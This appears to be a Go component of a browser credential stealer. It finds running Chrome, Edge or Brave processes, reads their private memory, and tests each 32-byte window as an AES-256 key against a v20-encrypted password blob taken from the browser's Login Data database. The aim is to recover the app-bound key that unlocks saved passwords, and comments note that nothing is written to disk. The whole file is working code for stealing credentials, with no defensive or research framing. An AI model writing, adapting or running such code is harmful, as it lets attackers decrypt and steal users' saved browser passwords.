//go:build decrypt && windows

package decrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")

	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = kernel32.NewProc("Process32FirstW")
	procProcess32Next            = kernel32.NewProc("Process32NextW")
	procVirtualQueryEx           = kernel32.NewProc("VirtualQueryEx")
	procReadProcessMemory        = kernel32.NewProc("ReadProcessMemory")
)

const (
	th32csSnapProcess   = 0x00000002
	memCommit           = 0x00001000
	memPrivate          = 0x00020000
	pageReadonly        = 0x00000002
	pageReadWrite       = 0x00000004
	pageExecuteRead     = 0x00000020
	pageExecuteReadWrite = 0x00000040
	pageWriteCopy       = 0x00000008

	maxRegionSize   = 64 * 1024 * 1024  // skip regions > 64 MB
	maxTotalScanned = 512 * 1024 * 1024 // stop after scanning 512 MB total per process
)

type processEntry32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

type memoryBasicInformation struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

// ScanChromeProcessMemory finds all running chrome.exe / msedge.exe processes,
// reads their MEM_PRIVATE+MEM_COMMIT pages, and searches for a 32-byte AES-256
// key that successfully decrypts a known v20-encrypted blob from Login Data.
// The decrypted key is returned for immediate use; no disk writes are made.
func ScanChromeProcessMemory(profileDir, browserName string) ([]byte, error) {
	// Get a v20 ciphertext blob to use as a validation oracle.
	blob, err := getFirstV20Blob(profileDir)
	if err != nil {
		return nil, fmt.Errorf("no v20 blob for validation: %w", err)
	}

	exeName := "chrome.exe"
	switch {
	case isEdge(browserName):
		exeName = "msedge.exe"
	case isBrave(browserName):
		exeName = "brave.exe"
	}

	pids, err := findProcessPIDs(exeName)
	if err != nil || len(pids) == 0 {
		return nil, fmt.Errorf("%s not running (no PIDs found)", exeName)
	}

	for _, pid := range pids {
		key, err := scanProcessMemoryForKey(pid, blob)
		if err == nil && key != nil {
			return key, nil
		}
	}
	return nil, fmt.Errorf("key not found in %s memory (try running while browser is open)", exeName)
}

func isEdge(name string) bool {
	switch name {
	case "Edge", "edge", "msedge":
		return true
	}
	return false
}

func isBrave(name string) bool {
	switch name {
	case "Brave", "brave":
		return true
	}
	return false
}

// findProcessPIDs returns all PIDs whose executable name matches (case-insensitive).
func findProcessPIDs(exeName string) ([]uint32, error) {
	snap, _, err := procCreateToolhelp32Snapshot.Call(th32csSnapProcess, 0)
	if snap == uintptr(syscall.InvalidHandle) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(windows.Handle(snap))

	var entry processEntry32
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil, fmt.Errorf("Process32First: empty snapshot")
	}

	target := syscall.UTF16ToString(entry.szExeFile[:])
	wantUTF16, _ := syscall.UTF16FromString(exeName)
	_ = wantUTF16

	var pids []uint32
	for {
		name := syscall.UTF16ToString(entry.szExeFile[:])
		if equalFold(name, exeName) {
			pids = append(pids, entry.th32ProcessID)
		}
		entry.dwSize = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	_ = target
	return pids, nil
}

func equalFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca, cb := a[i], b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 'a' - 'A'
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 'a' - 'A'
		}
		if ca != cb {
			return false
		}
	}
	return true
}

// getFirstV20Blob returns the first v20-prefixed encrypted_value from Login Data.
func getFirstV20Blob(profileDir string) ([]byte, error) {
	db, cleanup, err := openSQLiteCopy(profileDir + "/Login Data")
	if err != nil {
		return nil, err
	}
	defer cleanup()

	rows, err := db.Query(`SELECT password_value FROM logins LIMIT 50`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var enc []byte
		if err := rows.Scan(&enc); err != nil {
			continue
		}
		if len(enc) > 3 && string(enc[:3]) == "v20" {
			return enc, nil
		}
	}
	return nil, fmt.Errorf("no v20-encrypted entries in Login Data")
}

// scanProcessMemoryForKey walks all MEM_PRIVATE+MEM_COMMIT pages of the given
// PID, reads them in 4 KB chunks, and tries every 32-byte aligned candidate
// as an AES-256 key against the validation oracle blob.
func scanProcessMemoryForKey(pid uint32, blob []byte) ([]byte, error) {
	handle, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false, pid,
	)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(handle)

	var totalScanned int64
	var addr uintptr

	buf := make([]byte, 4*1024*1024) // 4 MB read buffer

	for {
		var mbi memoryBasicInformation
		ret, _, _ := procVirtualQueryEx.Call(
			uintptr(handle),
			addr,
			uintptr(unsafe.Pointer(&mbi)),
			unsafe.Sizeof(mbi),
		)
		if ret == 0 {
			break
		}

		next := mbi.BaseAddress + mbi.RegionSize

		// Only scan private, committed, readable pages of reasonable size.
		if mbi.State == memCommit &&
			mbi.Type == memPrivate &&
			isReadable(mbi.Protect) &&
			mbi.RegionSize <= maxRegionSize {

			size := int(mbi.RegionSize)
			if size > len(buf) {
				size = len(buf)
			}
			chunk := buf[:size]

			var nRead uintptr
			ret, _, _ := procReadProcessMemory.Call(
				uintptr(handle),
				mbi.BaseAddress,
				uintptr(unsafe.Pointer(&chunk[0])),
				uintptr(size),
				uintptr(unsafe.Pointer(&nRead)),
			)
			if ret != 0 && nRead >= 32 {
				if key := searchForKey(chunk[:nRead], blob); key != nil {
					return key, nil
				}
			}
			totalScanned += int64(nRead)
			if totalScanned > maxTotalScanned {
				break
			}
		}

		if next <= addr {
			break
		}
		addr = next
	}
	return nil, fmt.Errorf("key not found in PID %d", pid)
}

func isReadable(protect uint32) bool {
	// Mask off guard/nocache/writecombine modifiers.
	p := protect & 0xFF
	switch p {
	case pageReadonly, pageReadWrite, pageExecuteRead, pageExecuteReadWrite, pageWriteCopy:
		return true
	}
	return false
}

// searchForKey slides a 32-byte window through data and validates each
// high-entropy candidate against the v20 blob. Returns the key on success.
func searchForKey(data, blob []byte) []byte {
	if len(data) < 32 || len(blob) < 3+12+16 {
		return nil
	}
	for i := 0; i <= len(data)-32; i++ {
		candidate := data[i : i+32]
		if !hasMinEntropy(candidate) {
			continue
		}
		if validateChromeKey(candidate, blob) {
			out := make([]byte, 32)
			copy(out, candidate)
			return out
		}
	}
	return nil
}

// hasMinEntropy returns true when the 32-byte slice has at least 16 distinct
// byte values — cheap guard against null-filled pages and ASCII strings.
func hasMinEntropy(b []byte) bool {
	var seen [256]bool
	unique := 0
	for _, v := range b {
		if !seen[v] {
			seen[v] = true
			unique++
		}
	}
	return unique >= 16
}

// validateChromeKey attempts AES-256-GCM decryption of a v20 blob using the
// given 32-byte key. Returns true only when GCM authentication succeeds.
// False positive probability ≈ 2^-128 (negligible).
func validateChromeKey(key, blob []byte) bool {
	if string(blob[:3]) != "v20" {
		return false
	}
	raw := blob[3:] // 12-byte nonce + ciphertext + 16-byte tag
	if len(raw) < 12+16 {
		return false
	}
	nonce := raw[:12]
	ct := raw[12:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return false
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return false
	}
	pt, err := gcm.Open(nil, nonce, ct, nil)
	// v20 plaintext starts with 32 bytes of per-entry metadata.
	// We just need the decryption to succeed and produce non-empty output.
	return err == nil && len(pt) > 32
}
